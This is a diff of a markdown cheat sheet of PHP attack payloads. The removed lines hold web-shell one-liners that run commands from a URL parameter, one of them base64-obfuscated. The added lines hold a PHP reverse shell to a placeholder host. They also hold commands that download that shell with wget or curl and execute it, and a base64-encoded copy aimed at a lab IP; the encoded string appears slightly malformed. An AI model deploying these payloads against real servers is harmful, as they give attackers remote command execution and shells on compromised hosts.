@@ -1,23 +1,16 @@
-# PHP
+# Drop Shell
 
-## Simple 'cmd' exec
-```
-echo system($_GET['c']);
-```
+shell.txt:
 
-```
-echo exec($_GET['c']);
+```php
+<?php $sock=fsockopen("X.X.X.X",1234);exec("/bin/bash -i <&3 >&3 2>&3");?>
 ```
 
-### Base64 encoded:
-```
-eval(base64_decode('ZWNobyBzeXN0ZW0oJF9HRVRbJ2MnXSk7'));
-```
+payload:
 
-### With if
-```
-if (isset($_GET["c"])) { echo system($_GET['c']); }
-```
+```php
+<?php system("wget http://X.X.X.X/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>
+<?php system("curl http://X.X.X.X/shell.txt > /tmp/shell.php; php /tmp/shell.php"); ?>
 
-## External References
-- Invoke-PowerShellTcpOneLine.ps1: [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)
+<?php system("echo \"PD9waHAgPWZzb2Nrb3BlbigiMTAuMTAuMTQuMTYiLDEyMzQpO2V4ZWMoIi9iaW4vYmFzaCAtaSA8JjMgPiYzIDI+JjMiKTs/Pgo=\" | base64 -d > /tmp/shell.php; php /tmp/shell.php"); ?>
+```
